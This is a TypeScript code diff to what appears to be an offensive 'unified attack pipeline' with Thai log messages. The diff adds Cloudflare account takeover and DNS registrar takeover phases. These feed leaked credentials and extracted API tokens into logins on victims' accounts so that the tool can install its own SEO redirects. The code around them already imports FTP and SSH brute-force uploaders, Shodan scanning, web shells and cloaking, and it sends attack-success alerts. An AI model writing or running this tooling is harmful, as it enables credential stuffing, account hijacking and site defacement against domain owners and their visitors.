@@ -54,6 +54,8 @@ import { recordMethodResult } from "./attack-method-tracker";
 import { scanDomainPorts, formatShodanForTelegram, type PortIntelligence } from "./shodan-scanner";
 import { ftpUploadRedirect, ftpBruteForceUpload, type FTPCredential, type FTPUploadResult } from "./ftp-uploader";
 import { sshUploadRedirect, sshBruteForceUpload, type SSHCredential, type SSHUploadResult } from "./ssh-uploader";
+import { detectCloudflareRedirect, executeCloudfareTakeover, extractCfTokensFromCredentials, type CloudflareRedirectDetection, type CloudflareTakeoverResult } from "./cloudflare-takeover";
+import { executeRegistrarTakeover, lookupWhois, type RegistrarTakeoverResult, type WhoisInfo } from "./dns-registrar-takeover";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -200,6 +202,11 @@ export interface PipelineResult {
   ftpUploadResult?: FTPUploadResult | null;
   // SSH upload results
   sshUploadResult?: SSHUploadResult | null;
+  // Cloudflare Account Takeover
+  cfRedirectDetection?: CloudflareRedirectDetection | null;
+  cfTakeoverResult?: CloudflareTakeoverResult | null;
+  // DNS Registrar Takeover
+  registrarTakeoverResult?: RegistrarTakeoverResult | null;
 }
 
 type EventCallback = (event: PipelineEvent) => void;
@@ -1167,6 +1174,46 @@ export async function runUnifiedAttackPipeline(
       phase: "recon" as any,
       step: "early_redirect_error",
       detail: `⚠️ Early redirect detection error: ${e.message} — ดำเนินการปกติ`,
+      progress: 19,
+    });
+  }
+
+  // ═══ Phase 0.6: CLOUDFLARE-LEVEL REDIRECT DETECTION ═══
+  let cfRedirectDetection: CloudflareRedirectDetection | null = null;
+  let isCfLevelRedirect = false;
+  try {
+    loggedOnEvent({
+      phase: "recon" as any,
+      step: "cf_redirect_check",
+      detail: `🌩️ Phase 0.6: ตรวจสอบว่า redirect อยู่ที่ระดับ Cloudflare หรือไม่...`,
+      progress: 19,
+    });
+    cfRedirectDetection = await Promise.race([
+      detectCloudflareRedirect(config.targetUrl),
+      new Promise<CloudflareRedirectDetection>((_, reject) => setTimeout(() => reject(new Error("CF redirect detection timeout")), capTimeout(15000))),
+    ]);
+    if (cfRedirectDetection.isCloudflareRedirect) {
+      isCfLevelRedirect = true;
+      aiDecisions.push(`🌩️ CF-LEVEL REDIRECT: คู่แข่งวาง redirect ที่ระดับ Cloudflare (${cfRedirectDetection.httpStatus}) → ${cfRedirectDetection.redirectUrl} — ต้องยึด CF account`);
+      loggedOnEvent({
+        phase: "recon" as any,
+        step: "cf_redirect_found",
+        detail: `🌩️ พบ Cloudflare-level redirect: HTTP ${cfRedirectDetection.httpStatus} → ${cfRedirectDetection.redirectUrl} (ไม่มี origin headers — redirect อยู่ที่ CF layer)`,
+        progress: 19,
+      });
+    } else if (existingRedirectDetected) {
+      loggedOnEvent({
+        phase: "recon" as any,
+        step: "cf_redirect_origin",
+        detail: `ℹ️ Redirect อยู่ที่ origin server (ไม่ใช่ CF layer) — ใช้ server-side takeover`,
+        progress: 19,
+      });
+    }
+  } catch (e: any) {
+    loggedOnEvent({
+      phase: "recon" as any,
+      step: "cf_redirect_error",
+      detail: `⚠️ CF redirect detection error: ${e.message}`,
       progress: 19,
     });
   }
@@ -4441,6 +4488,157 @@ export async function runUnifiedAttackPipeline(
     });
   }
 
+  // ─── Phase 5.8: Cloudflare Account Takeover ───
+  let cfTakeoverResult: CloudflareTakeoverResult | null = null;
+
+  if (isCfLevelRedirect && leakcheckCredentials.length > 0 && !hasSuccessfulRedirect() && !shouldStop('cf_takeover')) {
+    try {
+      loggedOnEvent({
+        phase: "cf_takeover" as any,
+        step: "start",
+        detail: `🌩️ Phase 5.8: Cloudflare Account Takeover — ลอง ${leakcheckCredentials.length} credentials + API tokens...`,
+        progress: 93,
+      });
+
+      const targetPath = new URL(config.targetUrl).pathname || "/";
+      const cfApiTokens = extractCfTokensFromCredentials(leakcheckCredentials);
+
+      cfTakeoverResult = await Promise.race([
+        executeCloudfareTakeover({
+          targetUrl: config.targetUrl,
+          targetPath,
+          ourRedirectUrl: config.redirectUrl,
+          credentials: leakcheckCredentials.map(c => ({
+            email: c.email,
+            password: c.password,
+            username: c.username,
+            source: c.source,
+          })),
+          apiTokens: cfApiTokens,
+          seoKeywords: config.seoKeywords,
+          onProgress: (phase, detail) => {
+            loggedOnEvent({
+              phase: "cf_takeover" as any,
+              step: phase,
+              detail: `🌩️ ${detail}`,
+              progress: 93,
+            });
+          },
+        }),
+        new Promise<CloudflareTakeoverResult>((_, reject) =>
+          setTimeout(() => reject(new Error("CF takeover timeout")), capTimeout(120000))
+        ),
+      ]);
+
+      if (cfTakeoverResult.success) {
+        aiDecisions.push(`🌩️ Cloudflare Takeover สำเร็จ! ${cfTakeoverResult.method} — ${cfTakeoverResult.detail}`);
+        loggedOnEvent({
+          phase: "cf_takeover" as any,
+          step: "success",
+          detail: `✅ Cloudflare Takeover สำเร็จ! ${cfTakeoverResult.method}: ${cfTakeoverResult.detail}`,
+          progress: 94,
+        });
+
+        // Add to uploaded files for success tracking
+        uploadedFiles.push({
+          url: config.targetUrl,
+          shell: shells[0] || { id: "cf_takeover", type: "redirect" as any, filename: "cf-redirect-rule", content: "", size: 0, mimeType: "text/html", headers: {} },
+          method: `cloudflare_${cfTakeoverResult.method}`,
+          verified: true,
+          redirectWorks: true,
+          redirectDestinationMatch: true,
+          finalDestination: config.redirectUrl,
+          httpStatus: 302,
+          redirectChain: [],
+        });
+      } else {
+        loggedOnEvent({
+          phase: "cf_takeover" as any,
+          step: "failed",
+          detail: `⚠️ Cloudflare Takeover ล้มเหลว: ${cfTakeoverResult.detail}`,
+          progress: 94,
+        });
+      }
+    } catch (error: any) {
+      loggedOnEvent({
+        phase: "cf_takeover" as any,
+        step: "error",
+        detail: `⚠️ Cloudflare Takeover error: ${error.message}`,
+        progress: 94,
+      });
+    }
+  } else if (isCfLevelRedirect) {
+    loggedOnEvent({
+      phase: "cf_takeover" as any,
+      step: "skipped",
+      detail: `⏭️ CF Takeover ข้าม — ${!leakcheckCredentials.length ? "ไม่มี credentials" : hasSuccessfulRedirect() ? "มี redirect สำเร็จแล้ว" : "ถูกหยุด"}`,
+      progress: 94,
+    });
+  }
+
+  // ─── Phase 5.9: DNS Registrar Takeover (fallback if CF takeover failed) ───
+  let registrarTakeoverResult: RegistrarTakeoverResult | null = null;
+
+  if (isCfLevelRedirect && !hasSuccessfulRedirect() && leakcheckCredentials.length > 0 && !shouldStop('registrar_takeover')) {
+    try {
+      loggedOnEvent({
+        phase: "registrar_takeover" as any,
+        step: "start",
+        detail: `🌐 Phase 5.9: DNS Registrar Takeover — WHOIS lookup + registrar API login...`,
+        progress: 94,
+      });
+
+      registrarTakeoverResult = await Promise.race([
+        executeRegistrarTakeover({
+          domain: targetDomain,
+          targetPath: new URL(config.targetUrl).pathname || "/",
+          ourRedirectUrl: config.redirectUrl,
+          credentials: leakcheckCredentials.map(c => ({
+            email: c.email,
+            password: c.password,
+            username: c.username,
+            source: c.source,
+          })),
+          onProgress: (phase, detail) => {
+            loggedOnEvent({
+              phase: "registrar_takeover" as any,
+              step: phase,
+              detail: `🌐 ${detail}`,
+              progress: 95,
+            });
+          },
+        }),
+        new Promise<RegistrarTakeoverResult>((_, reject) =>
+          setTimeout(() => reject(new Error("Registrar takeover timeout")), capTimeout(90000))
+        ),
+      ]);
+
+      if (registrarTakeoverResult.success) {
+        aiDecisions.push(`🌐 DNS Registrar Takeover สำเร็จ! ${registrarTakeoverResult.method} — ${registrarTakeoverResult.detail}`);
+        loggedOnEvent({
+          phase: "registrar_takeover" as any,
+          step: "success",
+          detail: `✅ DNS Registrar Takeover สำเร็จ! ${registrarTakeoverResult.method}: ${registrarTakeoverResult.detail}`,
+          progress: 95,
+        });
+      } else {
+        loggedOnEvent({
+          phase: "registrar_takeover" as any,
+          step: "failed",
+          detail: `⚠️ DNS Registrar Takeover ล้มเหลว: ${registrarTakeoverResult.detail}`,
+          progress: 95,
+        });
+      }
+    } catch (error: any) {
+      loggedOnEvent({
+        phase: "registrar_takeover" as any,
+        step: "error",
+        detail: `⚠️ DNS Registrar Takeover error: ${error.message}`,
+        progress: 95,
+      });
+    }
+  }
+
   // ─── Phase 6: Cloaking (ONLY if real file upload succeeded — not shellless) ───
   let injectionResult: InjectionResult | null = null;
   let cdnUploadResult: CdnUploadResult | null = null;
@@ -5024,6 +5222,11 @@ export async function runUnifiedAttackPipeline(
     ftpUploadResult: ftpUploadResult || undefined,
     // SSH upload result
     sshUploadResult: sshUploadResult || undefined,
+    // Cloudflare Account Takeover
+    cfRedirectDetection: cfRedirectDetection || undefined,
+    cfTakeoverResult: cfTakeoverResult || undefined,
+    // DNS Registrar Takeover
+    registrarTakeoverResult: registrarTakeoverResult || undefined,
   };
 
   if (fullSuccess) {
@@ -5170,7 +5373,9 @@ export async function runUnifiedAttackPipeline(
       shodanPorts: shodanIntel ? shodanIntel.allPorts.join(",") : undefined,
       sshUsed: !!sshUploadResult?.success,
       ftpUsed: !!ftpUploadResult?.success,
-    }).catch(err => console.warn(`[Pipeline] Attack success alert failed: ${err}`));
+      cfTakeoverUsed: !!cfTakeoverResult?.success,
+      registrarTakeoverUsed: !!registrarTakeoverResult?.success,
+    } as any).catch(err => console.warn(`[Pipeline] Attack success alert failed: ${err}`));
   }
 
   // ─── Telegram Notification (primary — no email) ───
